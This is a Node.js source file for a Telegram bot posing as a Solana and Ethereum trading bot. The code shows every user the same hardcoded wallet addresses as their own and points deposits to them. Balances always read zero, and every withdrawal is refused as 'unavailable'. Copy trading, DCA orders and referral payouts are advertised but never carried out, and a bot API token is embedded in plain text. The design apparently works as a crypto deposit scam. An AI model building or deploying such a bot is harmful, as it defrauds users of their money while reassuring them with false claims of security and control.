const TelegramBot = require('node-telegram-bot-api');

const token = '8733934332:AAFthCGgtoqJqXp9tA-hB9n0zfP8t4PwviY';
const bot = new TelegramBot(token, { polling: true });

const userStates = {};

const solanaAddress = '6RkEyrpGuj3aaEtd8pycAhBtBSm9SkD2YYUPVTa93wwW';
const ethereumAddress = '0x6CB84b7D81CA9d7909103c04F5d39de5B27019ab';
const copyTradeWallet = 'GkDVo2kBVnbcLcsXYN3xQ9GFPZuMhn17EZD2cP521Am9';
const solanaBalance = '0.00';
const ethereumBalance = '0.00';

// -------------------
// FUNCTIONS
// -------------------

function sendMainMenu(chatId) {
  bot.sendMessage(chatId, "Main Menu", {
    reply_markup: {
      keyboard: [
        ["💰 Buy", "📉 Sell", "📊 Copy Trade"],
        ["📈 My Trades", "🌀 DCA Order", "👥 Referrals"],
        ["📌 Position", "💸 Withdraw", "⚙️ Settings"],
        ["ℹ️ Help"]
      ],
      resize_keyboard: true,
      one_time_keyboard: false
    },
    parse_mode: 'Markdown'
  });
}

function sendWelcomeVideo(chatId) {
  const welcomeMessage = `
Welcome to **Solana Trade Bot** – your trusted partner in fast, secure, and professional crypto trading!

**Your Wallets:**

**Solana (SOL)**
\`${solanaAddress}\` (Tap to Copy)  
Balance: ${solanaBalance} SOL

**Ethereum (ETH)**
\`${ethereumAddress}\` (Tap to Copy)  
Balance: ${ethereumBalance} ETH
⚡ Click /start anytime to refresh your balances.

🔹 Join our community: Stay updated with news, tips, and support via our Telegram group and official channels.

💡 We recommend using our supported bots for faster trading with the same wallets and settings. Enjoy a smoother, safer, and faster trading experience.

⚠️ **Security Reminder:** We never ask for passwords or private keys. Avoid fake airdrops and unverified links.
`;

  bot.sendVideo(chatId, './welcome.mp4', {
    caption: welcomeMessage,
    parse_mode: 'Markdown'
  }).then(() => sendMainMenu(chatId));
}

// -------------------
// START COMMAND
// -------------------
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  sendWelcomeVideo(chatId);
});

// -------------------
// MESSAGE HANDLER
// -------------------
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // -------------------
  // Withdraw flow
  // -------------------
  if (userStates[chatId] === "withdraw") {
    if (text === "SOL" || text === "ETH") {
      userStates[chatId] = "awaiting_withdraw_amount"; // next state
      userStates[chatId + "_network"] = text; // store selected network
      bot.sendMessage(chatId, `✅ You selected **${text} network**. Please enter the amount you want to withdraw:`, { parse_mode: 'Markdown' });
      return;
    } else if (text === "⬅️ Back") {
      userStates[chatId] = "main";
      sendMainMenu(chatId);
      return;
    }
  }

  // Handle input for amount after network selection
  if (userStates[chatId] === "awaiting_withdraw_amount") {
    const network = userStates[chatId + "_network"];
    bot.sendMessage(chatId, `⚠️ Withdrawal unavailable at this time for **${network}**.\nPlease try again later.`, { parse_mode: 'Markdown' });
    // Reset to main menu
    userStates[chatId] = "main";
    sendMainMenu(chatId);
    return;
  }

  // -------------------
  // Main switch cases
  // -------------------
  switch (text) {

    case "💰 Buy":
      bot.sendMessage(chatId, `💰 **Buy Solana and Ethereum Instantly!**\n\n**Wallet Addresses:**\n**Solana (SOL)** \`${solanaAddress}\`\n**Ethereum (ETH)** \`${ethereumAddress}\``, { parse_mode: 'Markdown' });
      break;

    case "📉 Sell":
      bot.sendMessage(chatId, `📊 You currently don’t hold any tokens. Purchase SOL in the Buy menu to start trading confidently!`);
      break;

    case "📊 Copy Trade":
      userStates[chatId] = "copytrade";
      bot.sendMessage(chatId, `
🔄 <b>Copy Trade Setup</b>

Current Wallet:
<code>${copyTradeWallet}</code>

Select an option below:
      `, {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["➕ Add New Address"],
            ["⬅️ Back"]
          ],
          resize_keyboard: true,
          one_time_keyboard: false
        }
      });
      break;

  case "➕ Add New Address":
  if (userStates[chatId] === "copytrade") {
    const balance = parseFloat(solanaBalance); // simulate balance, can be dynamic

    if (balance <= 0) {
      bot.sendMessage(chatId, `
⚠️ <b>Insufficient Funds</b>

Your wallet balance is 0 SOL.
You need available funds to activate copy trading.
      `, { parse_mode: "HTML" });
    } else {
      bot.sendMessage(chatId, `
🟢 <b>Copy Trading is Active</b>

Wallet: <code>${copyTradeWallet}</code>  
Balance: <b>${balance} SOL</b>

Copy trading has been successfully enabled.
      `, { parse_mode: "HTML" });
    }

    userStates[chatId] = "copytrade";
  }
  break;

    case "⬅️ Back":
      if (userStates[chatId] === "copytrade") {
        userStates[chatId] = "main";
        sendMainMenu(chatId);
      }
      break;

   // My Trades
case "📈 My Trades":
  const solBalance = parseFloat(solanaBalance);
  const ethBalance = parseFloat(ethereumBalance);

  if (solBalance <= 0 && ethBalance <= 0) {
    bot.sendMessage(chatId, `📌 You currently have no active trades. Begin by buying SOL or ETH to see your trades appear here securely.`);
  } else {
    let message = `📈 <b>Your Active Trades</b>\n\n`;
    if (solBalance > 0) message += `• SOL Balance: <b>${solBalance} SOL</b>\n`;
    if (ethBalance > 0) message += `• ETH Balance: <b>${ethBalance} ETH</b>\n`;
    bot.sendMessage(chatId, message, { parse_mode: "HTML" });
  }
  break;

    case "🌀 DCA Order":
      bot.sendMessage(chatId, `📈 **DCA Orders** are active. This allows you to invest consistently, reducing risk and increasing potential growth over time.`);
      break;

    case "👥 Referrals":
     bot.sendMessage(chatId, `
👥 **Invite & Earn Rewards**

Invite friends and enjoy fee discounts and reward shares:  
- Trade volume > $10k/week: 35% referral share  
- Otherwise: 25% share

**Your Referrals:**  
• Users referred: 0  
• Total rewards: 0 SOL ($0.00)  
• Total paid: 0 SOL  
• Total unpaid: 0 SOL

Rewards are securely airdropped daily to your chosen wallet (minimum 0.005 SOL). Our 5-layer referral system ensures maximum community benefit!
      `, { parse_mode: 'Markdown' });
      break;

    case "📌 Position":
      bot.sendMessage(chatId, `📍 You do not currently hold any tokens. Buy SOL to see your positions here.`);
      break;

    case "💸 Withdraw":
      userStates[chatId] = "withdraw";
      bot.sendMessage(chatId, `💰 Select the network to withdraw from safely:`, {
        reply_markup: {
          keyboard: [["SOL"], ["ETH"], ["⬅️ Back"]],
          resize_keyboard: true,
          one_time_keyboard: false
        }
      });
      break;

    case "ℹ️ Help":
      bot.sendMessage(chatId, `
<b>❓ Help & FAQ</b>

<b>How to use the bot:</b> Watch tutorials in our official playlist for step-by-step guidance.  
<b>Tokens available:</b> All SPL tokens, SOL/USDC pairs, plus direct trading on Raydium.  
<b>Referral code:</b> /start → 💰Referrals  
<b>Transaction timeouts:</b> Normal network delays, nothing to worry about.  
<b>Fees:</b> 1%, or 0.9% if referred. No hidden charges.  
<b>Net profit variance:</b> Includes transaction fees, fully transparent.  
<b>Support:</b> Contact @sol_tradingbot_support for real-time assistance.
      `, { parse_mode: 'HTML' });
      break;

    case "⚙️ Settings":
      bot.sendMessage(chatId, `
⚙️ **Bot Settings & Safety**

- 🚀 Fee Priority: Fast/Turbo/Custom  
- 🔴 Confirm Trades: Red = auto-execute  
- 🟢 Confirm Trades: Green = manual confirmation  
- 🛡 MEV Protection: Transactions sent privately to avoid frontrunning  
- 🟢 Sell Protection: Confirm selling >75% of balance

All settings designed to protect your funds and give you maximum control.
      `, { parse_mode: 'Markdown' });
      break;

    default:
      break;
  }
});

console.log('Bot is running...');